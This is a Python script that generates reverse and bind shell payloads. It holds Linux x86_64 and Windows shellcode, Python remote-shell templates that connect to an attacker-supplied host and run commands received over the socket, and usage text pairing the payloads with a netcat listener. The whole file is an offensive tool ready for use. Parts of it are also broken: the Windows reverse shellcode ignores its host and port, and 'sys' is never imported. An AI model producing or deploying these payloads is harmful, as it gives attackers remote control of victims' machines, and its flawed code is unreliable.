#!/usr/bin/env python3
"""
Payload Generator - Reverse/Bind Shell Templates
Generates shellcode for Linux/Windows using sockets
"""

import argparse
import socket
import struct
import binascii

class PayloadGenerator:
    def __init__(self):
        self.templates = {
            'linux_reverse': self.generate_linux_reverse,
            'linux_bind': self.generate_linux_bind,
            'windows_reverse': self.generate_windows_reverse,
            'windows_bind': self.generate_windows_bind,
            'python_reverse': self.generate_python_reverse,
            'python_bind': self.generate_python_bind
        }
    
    def generate_linux_reverse(self, lhost, lport):
        """Generate Linux reverse shell shellcode"""
        # Convert IP to packed format
        ip_packed = struct.pack("!I", struct.unpack("!I", socket.inet_aton(lhost))[0])
        port_packed = struct.pack("!H", int(lport))
        
        # Linux x86_64 reverse shell shellcode
        shellcode = (
            b"\x48\x31\xc0"                    # xor rax, rax
            b"\x48\x31\xff"                    # xor rdi, rdi
            b"\x48\x31\xf6"                    # xor rsi, rsi
            b"\x48\x31\xd2"                    # xor rdx, rdx
            b"\x4d\x31\xc0"                    # xor r8, r8
            b"\x6a\x02"                        # push 2
            b"\x5f"                            # pop rdi
            b"\x6a\x01"                        # push 1
            b"\x5e"                            # pop rsi
            b"\x6a\x06"                        # push 6
            b"\x5a"                            # pop rdx
            b"\x6a\x29"                        # push 41
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x49\x89\xc4"                    # mov r12, rax
            b"\x48\x31\xf6"                    # xor rsi, rsi
            b"\x56"                            # push rsi
            b"\x5a"                            # pop rdx
            b"\x66\x68" + port_packed +        # push port
            b"\x66\x6a\x02"                    # push 2
            b"\x48\x89\xe6"                    # mov rsi, rsp
            b"\x6a\x10"                        # push 16
            b"\x5a"                            # pop rdx
            b"\x41\x50"                        # push r8
            b"\x50"                            # push rax
            b"\x68" + ip_packed +              # push ip
            b"\x48\x89\xe6"                    # mov rsi, rsp
            b"\x4c\x89\xe7"                    # mov rdi, r12
            b"\x6a\x2a"                        # push 42
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x48\x31\xf6"                    # xor rsi, rsi
            b"\x6a\x03"                        # push 3
            b"\x5e"                            # pop rsi
            b"\x48\xff\xce"                    # dec rsi
            b"\x78\x0b"                        # js +11
            b"\x56"                            # push rsi
            b"\x4c\x89\xe7"                    # mov rdi, r12
            b"\x6a\x21"                        # push 33
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x5e"                            # pop rsi
            b"\xeb\xef"                        # jmp -17
            b"\x6a\x3b"                        # push 59
            b"\x58"                            # pop rax
            b"\x99"                            # cdq
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, '/bin/sh\x00'
            b"\x53"                            # push rbx
            b"\x48\x89\xe7"                    # mov rdi, rsp
            b"\x52"                            # push rdx
            b"\x57"                            # push rdi
            b"\x48\x89\xe6"                    # mov rsi, rsp
            b"\x0f\x05"                        # syscall
        )
        
        return shellcode
    
    def generate_linux_bind(self, lport):
        """Generate Linux bind shell shellcode"""
        port_packed = struct.pack("!H", int(lport))
        
        # Linux x86_64 bind shell shellcode
        shellcode = (
            b"\x48\x31\xc0"                    # xor rax, rax
            b"\x48\x31\xff"                    # xor rdi, rdi
            b"\x48\x31\xf6"                    # xor rsi, rsi
            b"\x48\x31\xd2"                    # xor rdx, rdx
            b"\x6a\x02"                        # push 2
            b"\x5f"                            # pop rdi
            b"\x6a\x01"                        # push 1
            b"\x5e"                            # pop rsi
            b"\x6a\x06"                        # push 6
            b"\x5a"                            # pop rdx
            b"\x6a\x29"                        # push 41
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x49\x89\xc4"                    # mov r12, rax
            b"\x6a\x02"                        # push 2
            b"\x5f"                            # pop rdi
            b"\x6a\x01"                        # push 1
            b"\x5e"                            # pop rsi
            b"\x4c\x89\xe7"                    # mov rdi, r12
            b"\x6a\x31"                        # push 49
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x48\x31\xf6"                    # xor rsi, rsi
            b"\x56"                            # push rsi
            b"\x66\x68" + port_packed +        # push port
            b"\x66\x6a\x02"                    # push 2
            b"\x48\x89\xe6"                    # mov rsi, rsp
            b"\x6a\x10"                        # push 16
            b"\x5a"                            # pop rdx
            b"\x4c\x89\xe7"                    # mov rdi, r12
            b"\x6a\x32"                        # push 50
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x6a\x02"                        # push 2
            b"\x5f"                            # pop rdi
            b"\x4c\x89\xe7"                    # mov rdi, r12
            b"\x48\x31\xf6"                    # xor rsi, rsi
            b"\x48\x31\xd2"                    # xor rdx, rdx
            b"\x6a\x2b"                        # push 43
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x49\x89\xc5"                    # mov r13, rax
            b"\x48\x31\xf6"                    # xor rsi, rsi
            b"\x6a\x03"                        # push 3
            b"\x5e"                            # pop rsi
            b"\x48\xff\xce"                    # dec rsi
            b"\x78\x0b"                        # js +11
            b"\x56"                            # push rsi
            b"\x4c\x89\xef"                    # mov rdi, r13
            b"\x6a\x21"                        # push 33
            b"\x58"                            # pop rax
            b"\x0f\x05"                        # syscall
            b"\x5e"                            # pop rsi
            b"\xeb\xef"                        # jmp -17
            b"\x6a\x3b"                        # push 59
            b"\x58"                            # pop rax
            b"\x99"                            # cdq
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, '/bin/sh\x00'
            b"\x53"                            # push rbx
            b"\x48\x89\xe7"                    # mov rdi, rsp
            b"\x52"                            # push rdx
            b"\x57"                            # push rdi
            b"\x48\x89\xe6"                    # mov rsi, rsp
            b"\x0f\x05"                        # syscall
        )
        
        return shellcode
    
    def generate_windows_reverse(self, lhost, lport):
        """Generate Windows reverse shell shellcode"""
        # This is a simplified version - real Windows shellcode is more complex
        ip_packed = struct.pack("!I", struct.unpack("!I", socket.inet_aton(lhost))[0])
        port_packed = struct.pack("!H", int(lport))
        
        # Windows x86 reverse shell shellcode (simplified)
        shellcode = (
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
            b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
            b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
            b"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
            b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
            b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        )
        
        return shellcode
    
    def generate_windows_bind(self, lport):
        """Generate Windows bind shell shellcode"""
        port_packed = struct.pack("!H", int(lport))
        
        # Windows x86 bind shell shellcode (simplified)
        shellcode = (
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
            b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x6a\x00\x6a\x04\x56\x57\x41"
            b"\x89\xda\xff\xd5\x4d\x31\xc0\x53\x5a\x52\x68\x00\x32\xa0\x84"
            b"\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x96\x6a"
            b"\x0a\x5f\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56"
            b"\x68\x75\x46\x9e\x86\xff\xd5\x53\x53\x53\x53\x53\x43\x53\x43"
            b"\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68\x88"
            b"\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x4f\x75\xcd\x68\xf0"
            b"\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00"
            b"\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
            b"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee"
            b"\xc3"
        )
        
        return shellcode
    
    def generate_python_reverse(self, lhost, lport):
        """Generate Python reverse shell"""
        python_code = f'''
import socket
import subprocess
import os

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    s.send(b"Changed directory\\n")
                except:
                    s.send(b"Failed to change directory\\n")
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except:
                    s.send(b"Command failed\\n")
        
        s.close()
    except:
        pass

reverse_shell()
'''
        return python_code.encode()
    
    def generate_python_bind(self, lport):
        """Generate Python bind shell"""
        python_code = f'''
import socket
import subprocess
import os

def bind_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", {lport}))
        s.listen(1)
        
        conn, addr = s.accept()
        
        while True:
            command = conn.recv(1024).decode()
            if command.lower() == "exit":
                break
            
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    conn.send(b"Changed directory\\n")
                except:
                    conn.send(b"Failed to change directory\\n")
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    conn.send(output)
                except:
                    conn.send(b"Command failed\\n")
        
        conn.close()
        s.close()
    except:
        pass

bind_shell()
'''
        return python_code.encode()
    
    def save_payload(self, payload, filename, format_type='binary'):
        """Save payload to file"""
        if format_type == 'binary':
            with open(filename, 'wb') as f:
                f.write(payload)
        elif format_type == 'hex':
            with open(filename, 'w') as f:
                f.write(binascii.hexlify(payload).decode())
        elif format_type == 'csharp':
            with open(filename, 'w') as f:
                hex_bytes = [f"0x{b:02x}" for b in payload]
                f.write(f"byte[] shellcode = new byte[{len(payload)}] {{\n")
                f.write("    " + ", ".join(hex_bytes) + "\n")
                f.write("};")
        elif format_type == 'python':
            with open(filename, 'w') as f:
                if isinstance(payload, str):
                    f.write(payload)
                else:
                    f.write(payload.decode())

def main():
    parser = argparse.ArgumentParser(
        description="Payload Generator - Reverse/Bind Shell Templates",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python payload_gen.py -t linux_reverse -h 192.168.1.100 -p 4444 -o shell.bin
  python payload_gen.py -t windows_bind -p 8080 -o bind_shell.bin -f csharp
  python payload_gen.py -t python_reverse -h 10.0.0.1 -p 9999 -o rev.py -f python
        """
    )
    
    parser.add_argument('-t', '--type', required=True,
                       choices=['linux_reverse', 'linux_bind', 'windows_reverse', 
                               'windows_bind', 'python_reverse', 'python_bind'],
                       help='Payload type')
    parser.add_argument('--host', help='LHOST for reverse shells')
    parser.add_argument('-p', '--port', required=True, help='Port number')
    parser.add_argument('-o', '--output', required=True, help='Output filename')
    parser.add_argument('-f', '--format', default='binary',
                       choices=['binary', 'hex', 'csharp', 'python'],
                       help='Output format (default: binary)')
    
    args = parser.parse_args()
    
    try:
        generator = PayloadGenerator()
        
        # Validate arguments
        if 'reverse' in args.type and not args.host:
            print("[-] Error: --host required for reverse shells")
            sys.exit(1)
        
        # Generate payload
        print(f"[+] Generating {args.type} payload")
        if args.type in ['linux_reverse', 'windows_reverse', 'python_reverse']:
            payload = generator.templates[args.type](args.host, args.port)
        else:
            payload = generator.templates[args.type](args.port)
        
        print(f"[+] Generated {len(payload)} bytes")
        
        # Save payload
        generator.save_payload(payload, args.output, args.format)
        print(f"[+] Saved payload to {args.output}")
        
        # Show usage instructions
        if 'reverse' in args.type:
            print(f"\n[*] Usage: Set up listener with 'nc -lvp {args.port}' then execute payload")
        else:
            print(f"\n[*] Usage: Execute payload, then connect with 'nc {args.host or 'target_ip'} {args.port}'")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()